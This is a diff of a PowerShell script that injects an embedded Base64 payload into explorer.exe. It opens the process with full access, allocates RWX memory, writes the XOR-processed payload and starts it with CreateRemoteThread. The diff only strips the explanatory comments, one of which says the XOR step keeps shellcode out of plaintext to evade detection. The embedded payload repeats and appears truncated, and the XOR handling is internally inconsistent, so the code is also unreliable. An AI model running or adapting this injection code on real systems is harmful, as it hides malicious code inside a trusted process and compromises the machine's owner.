@@ -59,15 +59,12 @@ public class Win32 {
 }
 "@
 
-# Compile the Win32 API class
 Add-Type -TypeDefinition $Win32Code -Name "Win32API" -Namespace "Interop"
 
-# --- Constants ---
 $PROCESS_ALL_ACCESS = 0x001F0FFF  # Full access to the process
 $MEM_COMMIT_RESERVE = 0x3000       # MEM_COMMIT | MEM_RESERVE
 $PAGE_EXECUTE_READWRITE = 0x40     # RWX permissions
 
-# --- XOR Decryption Function (Avoids Plaintext Shellcode in Memory) ---
 function Invoke-XorDecrypt {
     param(
         [Byte[]]$Data,
@@ -86,19 +83,15 @@ $Base64Payload = @"
 TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAiELAQsAAAgAAAAGAAAAAAAAzi4AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACQuAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAADYLQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAJAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAC0LgAAAAAAAEgAAAACAAUAECEAAMQKAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABswAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgAAABMwAwBDAAAAAQAAEXMBAAAKCn4BAAAEJY0DAAABJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGJRYgAAAAgHMFAAAGKgATMAQAQwAAAAEAABFzAQAACgp+AQAA
 "@
 
-# --- Main Injection Logic ---
 try {
-    # 1. Find explorer.exe (common target)
     $TargetProcess = Get-Process explorer -ErrorAction Stop | Select-Object -First 1
     Write-Host "[+] Target PID: $($TargetProcess.Id)"
 
-    # 2. Open the process with full access
     $hProcess = [Interop.Win32API]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetProcess.Id)
     if ($hProcess -eq [IntPtr]::Zero) {
         throw "OpenProcess failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
     }
 
-    # 3. Allocate RWX memory in the target process
     $Shellcode = [Convert]::FromBase64String($Base64Payload)
     $XorKey = 0x55
     $EncryptedShellcode = Invoke-XorDecrypt -Data $Shellcode -Key $XorKey
@@ -114,7 +107,6 @@ try {
         throw "VirtualAllocEx failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
     }
 
-    # 4. Write the decrypted shellcode into memory
     $BytesWritten = 0
     $Success = [Interop.Win32API]::WriteProcessMemory(
         $hProcess,
@@ -127,7 +119,6 @@ try {
         throw "WriteProcessMemory failed (Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
     }
 
-    # 5. Execute the shellcode in a new thread
     $hThread = [Interop.Win32API]::CreateRemoteThread(
         $hProcess,
         [IntPtr]::Zero,
@@ -147,7 +138,6 @@ catch {
     Write-Error "[-] Injection failed: $_"
 }
 finally {
-    # 6. Clean up handles (critical for stability)
     if ($hProcess -ne [IntPtr]::Zero) {
         [Interop.Win32API]::CloseHandle($hProcess) | Out-Null
     }
